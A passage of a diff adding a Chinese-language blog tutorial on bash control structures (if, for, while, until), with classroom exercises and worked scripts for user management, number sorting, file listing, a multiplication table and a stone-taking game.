+* 判断符号两边有空格</code></pre><h3 id="if-语法格式"><a href="#if-语法格式" class="headerlink" title="if 语法格式"></a>if 语法格式</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">if condition	--&gt;condition 指的是判断的条件</span><br><span class="line">then		</span><br><span class="line">	CMD1	--&gt; CMD1 指的是满足判断条件后执行的语句</span><br><span class="line">else</span><br><span class="line">	CMD2	--&gt; CMD2 指的是不满足判断条件执行的语句 then</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">if condition</span><br><span class="line">then</span><br><span class="line">	CMD1</span><br><span class="line">elif condition</span><br><span class="line">	CMD2</span><br><span class="line">else</span><br><span class="line">	CMD3</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
+<h4 id="课堂练习"><a href="#课堂练习" class="headerlink" title="课堂练习"></a>课堂练习</h4><pre><code>1. 写一个脚本，判断用户是否存在，如果存在则删除。若不存在，就提示不存在。
+2. 三个数字比大小，输出最大的
+3. 三个数字比大小,并且按从大到小排列</code></pre><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">[<span class="comment">#74#root@client0 ~]#cat usertest.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">"plz input username:"</span> user</span><br><span class="line"><span class="keyword">if</span> id <span class="variable">$user</span> &amp;&gt; /dev/null</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">	userdel -r <span class="variable">$user</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">"student not exits"</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">[<span class="comment">#75#root@client0 ~]#cat num.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$1</span> -gt <span class="variable">$2</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">	<span class="keyword">if</span> [ <span class="variable">$1</span> -gt <span class="variable">$3</span> ]</span><br><span class="line">	<span class="keyword">then</span></span><br><span class="line">		<span class="built_in">echo</span> <span class="string">"max is <span class="variable">$1</span>"</span></span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">echo</span> <span class="string">"max is <span class="variable">$3</span>"</span></span><br><span class="line">	<span class="keyword">fi</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	<span class="keyword">if</span> [ <span class="variable">$2</span> -gt <span class="variable">$3</span> ]</span><br><span class="line">	<span class="keyword">then</span></span><br><span class="line">		<span class="built_in">echo</span> <span class="string">"max is <span class="variable">$2</span>"</span></span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">echo</span> <span class="string">"max is <span class="variable">$3</span>"</span></span><br><span class="line">	<span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;#&#125;</span></span><br><span class="line">[<span class="comment">#76#root@client0 ~]#bash num.sh 9 8 80</span></span><br><span class="line">max is 80</span><br><span class="line">3</span><br><span class="line">[<span class="comment">#99#root@client0 ~]#cat sort.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$1</span> -ge <span class="variable">$2</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">	n1=<span class="variable">$1</span></span><br><span class="line">	n2=<span class="variable">$2</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	n1=<span class="variable">$2</span></span><br><span class="line">	n2=<span class="variable">$1</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$n1</span> -ge <span class="variable">$3</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">	max=<span class="variable">$n1</span></span><br><span class="line">	<span class="keyword">if</span> [ <span class="variable">$n2</span> -ge <span class="variable">$3</span> ]</span><br><span class="line">	<span class="keyword">then</span></span><br><span class="line">		be=<span class="variable">$n2</span></span><br><span class="line">		min=<span class="variable">$3</span></span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		be=<span class="variable">$3</span></span><br><span class="line">		min=<span class="variable">$n2</span></span><br><span class="line">	<span class="keyword">fi</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	max=<span class="variable">$3</span></span><br><span class="line">	be=<span class="variable">$n1</span></span><br><span class="line">	min=<span class="variable">$n2</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$max</span> <span class="variable">$be</span> <span class="variable">$min</span></span><br><span class="line">[<span class="comment">#101#root@client0 ~]#bash sort.sh 3 8 1</span></span><br><span class="line">8 3 1</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="for-语法格式"><a href="#for-语法格式" class="headerlink" title="for 语法格式"></a>for 语法格式</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for 变量 in 取值范围</span><br><span class="line">do</span><br><span class="line">	CMD</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
+<h4 id="取值范围"><a href="#取值范围" class="headerlink" title="取值范围"></a>取值范围</h4><ul>
+<li><p>以空格分割</p>
+<pre><code>for i in 1 2 3
+for i in 5 7 10
+for i in a b c</code></pre><p>例子：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">         for i in 10 11</span><br><span class="line">do</span><br><span class="line">	ssh root@172.25.0.$i &quot;yum install -y wget&quot;</span><br><span class="line">done</span><br><span class="line">for i in xx uu</span><br><span class="line">do</span><br><span class="line">	ls &#x2F;tmp&#x2F;$i</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>以{}罗列        {1..10}</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">可以使用seq	$(seq 1 10)&#x3D;&#x3D;&gt;1 2 3 4 5 6 7 8 9 10</span><br><span class="line">		&#96;seq 1 10&#96;</span><br><span class="line">		seq 1 2 10&#x3D;&#x3D;&gt;1 3 5 7 9</span><br><span class="line">		seq 10 -1 1&#x3D;&#x3D;&gt;10 9 8 7 6 5 4 3 2 1</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h4 id="命令行方式"><a href="#命令行方式" class="headerlink" title="命令行方式"></a>命令行方式</h4><pre><code>for i in {1..10};do echo $i;done</code></pre><h4 id="课堂练习-1"><a href="#课堂练习-1" class="headerlink" title="课堂练习"></a>课堂练习</h4><ol>
+<li>统计当前系统一共有多少个用户，并且向每个用户问好，屏幕输出“hello $username,your uid is $uid”</li>
+<li>依次向/var/目录下的每个文件问好“hello $file” ,统计一共有多少个文件</li>
+<li>输入用户名，当前系统中属于该用户的所有文件都会打印在屏幕上，并且告诉你文件大小超过$size的文件有哪些</li>
+<li>计算某个命令执行的时间</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">[root@client47 ~]<span class="comment"># cat for1.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> 系统中一共有：`cat /etc/passwd |wc -l`个用户</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `cut -d <span class="string">":"</span> -f 1 /etc/passwd 2&gt;/dev/null`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">	username=<span class="variable">$i</span></span><br><span class="line">	uid=`grep ^<span class="variable">$i</span> /etc/passwd |cut -d <span class="string">":"</span> -f 3 2&gt;/dev/null`</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">"hello <span class="variable">$username</span>,your uid is <span class="variable">$uid</span>"</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">[root@client47 ~]<span class="comment"># bash for1.sh</span></span><br><span class="line">系统中一共有：22个用户</span><br><span class="line">hello root,your uid is 0</span><br><span class="line">hello bin,your uid is 1</span><br><span class="line">hello daemon,your uid is 2</span><br><span class="line">hello adm,your uid is 3</span><br><span class="line">hello lp,your uid is 4</span><br><span class="line">hello sync,your uid is 5</span><br><span class="line">hello shutdown,your uid is 6</span><br><span class="line">hello halt,your uid is 7</span><br><span class="line">hello mail,your uid is 8</span><br><span class="line">hello operator,your uid is 11</span><br><span class="line">hello games,your uid is 12</span><br><span class="line">hello ftp,your uid is 14</span><br><span class="line">hello nobody,your uid is 99</span><br><span class="line">hello avahi-autoipd,your uid is 170</span><br><span class="line">hello systemd-bus-proxy,your uid is 999</span><br><span class="line">hello systemd-network,your uid is 998</span><br><span class="line">hello dbus,your uid is 81</span><br><span class="line">hello polkitd,your uid is 997</span><br><span class="line">hello tss,your uid is 59</span><br><span class="line">hello postfix,your uid is 89</span><br><span class="line">hello sshd,your uid is 74</span><br><span class="line">hello student,your uid is 1000</span><br><span class="line"></span><br><span class="line">[root@client47 ~]<span class="comment"># cat for2.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `ls /var/`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">	<span class="built_in">echo</span> hello <span class="variable">$i</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> /var目录中一共有`ls -l /var/|wc -l`个文件</span><br><span class="line">[root@client47 ~]<span class="comment"># bash for2.sh</span></span><br><span class="line">hello adm</span><br><span class="line">hello cache</span><br><span class="line">hello crash</span><br><span class="line">hello db</span><br><span class="line">hello empty</span><br><span class="line">hello games</span><br><span class="line">hello gopher</span><br><span class="line">hello kerberos</span><br><span class="line">hello lib</span><br><span class="line">hello <span class="built_in">local</span></span><br><span class="line">hello lock</span><br><span class="line">hello <span class="built_in">log</span></span><br><span class="line">hello mail</span><br><span class="line">hello nis</span><br><span class="line">hello opt</span><br><span class="line">hello preserve</span><br><span class="line">hello run</span><br><span class="line">hello spool</span><br><span class="line">hello tmp</span><br><span class="line">hello yp</span><br><span class="line">/var目录中一共有21个文件</span><br><span class="line"></span><br><span class="line">[root@client47 ~]<span class="comment"># cat for3.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">"请输入用户名："</span> username</span><br><span class="line"><span class="built_in">read</span> -p <span class="string">"请输入文件SIZE的最大值："</span> size</span><br><span class="line"></span><br><span class="line">find / -user <span class="variable">$username</span> -size +<span class="variable">$size</span> 2&gt;/dev/null</span><br><span class="line">[root@client47 ~]<span class="comment"># bash for3.sh</span></span><br><span class="line">请输入用户名：root</span><br><span class="line">请输入文件SIZE的最大值：500M</span><br><span class="line">/proc/kcore</span><br><span class="line">[root@client47 ~]<span class="comment"># bash for3.sh</span></span><br><span class="line">请输入用户名：root</span><br><span class="line">请输入文件SIZE的最大值：100M</span><br><span class="line">/proc/kcore</span><br><span class="line">/usr/lib/locale/locale-archive</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@client47 ~]<span class="comment"># cat for4.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">"plz input CMD:"</span> cmd</span><br><span class="line">start=`date +%s`</span><br><span class="line"><span class="variable">$cmd</span> &amp;&gt; /dev/null</span><br><span class="line">end=`date +%s`</span><br><span class="line">time=$((<span class="variable">$end</span>-<span class="variable">$start</span>))</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$cmd</span> 执行的时间为 <span class="variable">$time</span></span><br><span class="line">[root@client47 ~]<span class="comment"># bash for4.sh</span></span><br><span class="line">plz input CMD:xz -d /tmp/big.xz</span><br><span class="line">xz -d /tmp/big.xz 执行的时间为 2</span><br></pre></td></tr></table></figure>
+
+<h4 id="拓展题"><a href="#拓展题" class="headerlink" title="拓展题"></a>拓展题</h4><ol>
+<li>画斜线正反<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*</span><br><span class="line"> *</span><br><span class="line">  *</span><br><span class="line">   *</span><br></pre></td></tr></table></figure></li>
+<li>写一个9*9乘法表</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">[root@client0 ~]<span class="comment"># cat x1.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment">#行数	空格	*数量</span></span><br><span class="line"><span class="comment">#1 	0 	1</span></span><br><span class="line"><span class="comment">#2	1	1</span></span><br><span class="line"><span class="comment">#3	2	1</span></span><br><span class="line"><span class="comment">#n	n-1	1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `seq 1 <span class="variable">$1</span>`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> `seq 1 $((<span class="variable">$i</span>-1))`</span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">		<span class="built_in">echo</span> -n <span class="string">' '</span></span><br><span class="line">	<span class="keyword">done</span></span><br><span class="line">	<span class="built_in">echo</span>  <span class="string">'*'</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">[root@client0 ~]<span class="comment"># bash x1.sh 4</span></span><br><span class="line">*</span><br><span class="line"> *</span><br><span class="line">  *</span><br><span class="line">   *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@client0 ~]<span class="comment"># cat x2.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment">#1*1=1</span></span><br><span class="line"><span class="comment">#2*1=2	2*2=4</span></span><br><span class="line"><span class="comment">#3*1=3	3*2	3*3</span></span><br><span class="line"><span class="comment">#9*1	9*2				9*9=</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `seq 1 9`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> `seq 1 <span class="variable">$i</span>`</span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">		<span class="built_in">echo</span> -n <span class="string">"<span class="variable">$i</span>*<span class="variable">$j</span>=<span class="variable">$(($i*$j)</span>) "</span></span><br><span class="line">	<span class="keyword">done</span></span><br><span class="line">	<span class="built_in">echo</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@client0 ~]<span class="comment"># bash x2.sh</span></span><br><span class="line">1*1=1</span><br><span class="line">2*1=2 2*2=4</span><br><span class="line">3*1=3 3*2=6 3*3=9</span><br><span class="line">4*1=4 4*2=8 4*3=12 4*4=16</span><br><span class="line">5*1=5 5*2=10 5*3=15 5*4=20 5*5=25</span><br><span class="line">6*1=6 6*2=12 6*3=18 6*4=24 6*5=30 6*6=36</span><br><span class="line">7*1=7 7*2=14 7*3=21 7*4=28 7*5=35 7*6=42 7*7=49</span><br><span class="line">8*1=8 8*2=16 8*3=24 8*4=32 8*5=40 8*6=48 8*7=56 8*8=64</span><br><span class="line">9*1=9 9*2=18 9*3=27 9*4=36 9*5=45 9*6=54 9*7=63 9*8=72 9*9=81</span><br></pre></td></tr></table></figure>
+
+<h3 id="while-语法格式"><a href="#while-语法格式" class="headerlink" title="while 语法格式"></a>while 语法格式</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">	while condition 指的是判断的条件</span><br><span class="line">	do</span><br><span class="line">		CMD</span><br><span class="line">	done</span><br><span class="line">数字的判断 	字符的判断 	文件的判断</span><br><span class="line">	-gt 大于 	-z 空 		-d 文件是不是一个目录</span><br><span class="line">	-ge 大于等于 	=  字符相等 	-f 是不是一个普通文件</span><br><span class="line">	-lt 小于 	!= 字符不相等 	-e 文件是不是存在</span><br><span class="line">	-le 小于等于 	-n 非空 	</span><br><span class="line">	-ne 不等于 	-a 逻辑与</span><br><span class="line">	-eq 等于 	-o 逻辑或</span><br></pre></td></tr></table></figure>
+
+
+<ol>
+<li>当什么的时候就做什么,体验无限循环<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">touch /tmp/whilefile</span><br><span class="line">while [ -f /tmp/whilefile ]</span><br><span class="line">do</span><br><span class="line">	cat &gt;&gt; /tmp/whilefile &lt;&lt; ENDF</span><br><span class="line">当山峰没有棱角的时候</span><br><span class="line">当河水不再流</span><br><span class="line">。。。</span><br><span class="line">我哈哈ishi</span><br><span class="line">ENDF</span><br><span class="line"></span><br><span class="line">done</span><br></pre></td></tr></table></figure></li>
+<li>不满足条件跳出循环<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">判断/tmp/whilefile2是否存在，不存在的时候我们去创建</span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">while [ ! -e /tmp/whilefile2 ]</span><br><span class="line">do</span><br><span class="line">	cat &gt; /tmp/whilefile2 &lt;&lt; ENDF</span><br><span class="line">hello</span><br><span class="line">ENDF</span><br><span class="line"></span><br><span class="line">done</span><br></pre></td></tr></table></figure>
+
+
+</li>
+</ol>
+<h3 id="until-语法格式"><a href="#until-语法格式" class="headerlink" title="until 语法格式"></a>until 语法格式</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">until condition --&gt; 不满足 condition, 则执行 cmd</span><br><span class="line">do</span><br><span class="line">	CMD</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
+
+<h4 id="课堂练习-2"><a href="#课堂练习-2" class="headerlink" title="课堂练习"></a>课堂练习</h4><pre><code>1. 连乘算法 while和until
+2. 要求根据userlist创建用户，要求指定用户名，用户id，用户的附加组及变更用户u密码，若对应用户的附加组不存在，则将附加组创建出来后再根据要求添加用户。
+userlist文件的格式如下：
+carol 777 tom uplooking
+natasha 778 tom uplooking
+r1 779 tom uplooking
+3. 要求根据userlist创建用户，要求指定用户名，用户id，用户的默认组和附加组及变更用户u密码，若对应用户的附加组不存在，则将附加组创建出来后再根据要求添加用户。
+[root@rhel6 ~]# cat /tmp/useraddlist1
+dabao 888 xuexi,it uplooking
+lucy 889 sales,it uplooking
+lily 899 pro,aa uplooking</code></pre><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@client0 ~]<span class="comment"># cat useradd.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">read</span> a</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">	A=(<span class="variable">$a</span>)</span><br><span class="line">	groupadd <span class="variable">$&#123;A[2]&#125;</span> &amp;&gt; /dev/null</span><br><span class="line">	useradd -u <span class="variable">$&#123;A[1]&#125;</span> -G <span class="variable">$&#123;A[2]&#125;</span> <span class="variable">$&#123;A[0]&#125;</span> &amp;&gt; /dev/null</span><br><span class="line">	<span class="built_in">echo</span> <span class="variable">$&#123;A[3]&#125;</span>|passwd --stdin <span class="variable">$&#123;A[0]&#125;</span> &amp;&gt; /dev/null</span><br><span class="line">	id <span class="variable">$&#123;A[0]&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">done</span>&lt;/root/userlist</span><br><span class="line"></span><br><span class="line">[root@client0 ~]<span class="comment"># bash useradd.sh</span></span><br><span class="line">uid=777(carol) gid=1001(carol) groups=1001(carol),1000(tom)</span><br><span class="line">uid=778(natasha) gid=1002(natasha) groups=1002(natasha),1000(tom)</span><br><span class="line">uid=779(r1) gid=1003(r1) groups=1003(r1),1000(tom)</span><br></pre></td></tr></table></figure>
+
+<h3 id="晚自习作业"><a href="#晚自习作业" class="headerlink" title="晚自习作业"></a>晚自习作业</h3><ol>
+<li>完成今天课上的所有练习题目</li>
+<li>石子游戏：有n石子，谁拿到最后一个石子谁赢，<br>用户可以指定一共由多少个石子，每次最多可以拿的石子数是可以给用户指定的</li>
+<li>创建一个以今天日期为名的目录20160811;<br>将/目录下所有以.sh结尾的文件复制到新创建的目录中；<br>将该目录打包压缩存到/tmp目录下保存。</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">[root@client0 ~]<span class="comment"># cat game</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">"游戏开始！请玩家指定石子的个数:"</span> n1</span><br><span class="line"><span class="built_in">read</span> -p <span class="string">"请玩家指定每次取石子的最多个数:"</span> n2</span><br><span class="line"></span><br><span class="line">k=$((<span class="variable">$n1</span>%(<span class="variable">$n2</span>+1)))</span><br><span class="line">j=$((<span class="variable">$n1</span>/(<span class="variable">$n2</span>+1)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">HH</span></span> () &#123;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `seq 1 <span class="variable">$j</span>`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">	<span class="built_in">read</span> -p <span class="string">"请玩家取石子:"</span> w</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">"我取 <span class="variable">$((($n2+1)</span>-<span class="variable">$w</span>)) 个石子"</span></span><br><span class="line">	q=$((<span class="variable">$q</span>-(<span class="variable">$n2</span>+1)))</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">"目前还剩下 <span class="variable">$q</span> 个石子"</span></span><br><span class="line">	[ <span class="variable">$q</span> -eq 0 ] &amp;&amp; <span class="built_in">echo</span> <span class="string">"你输了@.@!"</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [[ <span class="variable">$k</span> -gt 0 ]]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">"我先取 <span class="variable">$k</span> 个石子"</span></span><br><span class="line">	q=$((<span class="variable">$n1</span>-<span class="variable">$k</span>))</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">"目前还剩下 <span class="variable">$q</span> 个石子"</span></span><br><span class="line">	HH</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	q=<span class="variable">$n1</span></span><br><span class="line">	HH</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
+
